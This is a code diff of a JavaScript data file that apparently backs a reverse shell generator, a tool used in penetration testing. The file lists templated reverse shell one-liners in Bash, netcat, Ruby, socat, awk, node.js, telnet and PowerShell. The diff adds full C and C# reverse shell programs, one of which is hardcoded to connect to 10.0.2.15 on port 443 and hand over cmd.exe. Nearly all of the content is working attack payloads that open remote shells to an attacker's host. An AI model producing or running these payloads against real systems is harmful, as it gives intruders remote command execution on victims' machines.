@@ -10,13 +10,17 @@ const rsgData = {
     ],
 
     shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
-    
+
+    upgrade: ['python', ],
+    //C shell needs fixed
     reverseShellsCommands: [
         ['Bash -i', '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1'],
         ['Bash 196', '0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196'],
         ['Bash read line', 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'],
         ['Bash 5', '{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5'],
         ['Bash udp', '{shell} -i >& /dev/udp/{ip}/{port} 0>&1'],
+        ['C', '#include &lt;stdio.h\>\n#include &lt;sys\/socket.h\>\n#include &lt;sys\/types.h\>\n#include &lt;stdlib.h\>\n#include &lt;unistd.h>\n#include &lt;netinet/in.h\>\n#include &lt;arpa/inet.h\>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr("{ip}");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {"{shell}", NULL};\n    execve("{shell}", argv, NULL);\n\n    return 0;       \n}'],
+        ['C#', 'using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n	public class Program\n	{\n		static StreamWriter streamWriter;\n\n		public static void Main(string[] args)\n		{\n			using(TcpClient client = new TcpClient("10.0.2.15", 443))\n			{\n				using(Stream stream = client.GetStream())\n				{\n					using(StreamReader rdr = new StreamReader(stream))\n					{\n						streamWriter = new StreamWriter(stream);\n						\n						StringBuilder strInput = new StringBuilder();\n\n						Process p = new Process();\n						p.StartInfo.FileName = "cmd.exe";\n						p.StartInfo.CreateNoWindow = true;\n						p.StartInfo.UseShellExecute = false;\n						p.StartInfo.RedirectStandardOutput = true;\n						p.StartInfo.RedirectStandardInput = true;\n						p.StartInfo.RedirectStandardError = true;\n						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n						p.Start();\n						p.BeginOutputReadLine();\n\n						while(true)\n						{\n							strInput.Append(rdr.ReadLine());\n							//strInput.Append("\\n");\n							p.StandardInput.WriteLine(strInput);\n							strInput.Remove(0, strInput.Length);\n						}\n					}\n				}\n			}\n		}\n\n		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n	}\n}'],
         ['nc mkfifo', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'],
         ['nc -e', 'nc -e {shell} {ip} {port}'],
         ['nc -c', 'nc -c {shell} {ip} {port}'],
@@ -41,7 +45,7 @@ const rsgData = {
         ['Ruby #1', 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("{shell} -i <&%d >&%d 2>&%d",f,f,f)\''],
         ['Ruby no sh', 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''],
         ['socat #1', 'socat TCP:{ip}:{port} EXEC:{shell}'],
-        ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane'],
+        ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'{shell}\',pty,stderr,setsid,sigint,sane'],
         ['awk', 'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'],
         ['node.js', 'require(\'child_process\').exec(\'nc -e {shell} {ip} {port}\')'],
         ['telnet', 'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF'],
@@ -49,5 +53,22 @@ const rsgData = {
 
     specialCommands: {
         'PowerShell payload': '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-    }
+    },
+    commands: [
+        {
+           name: 'Bash -i',
+           command: '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1',
+           meta: ['linux', 'windows', 'mac']  
+        },
+        {
+            name: 'Bash 196',
+            command: '0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196',
+            meta: ['windows', 'mac']
+         },
+         {
+            name: 'Bash read line',
+            command: 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
+            meta: ['linux', 'mac']
+         },
+    ]
 }
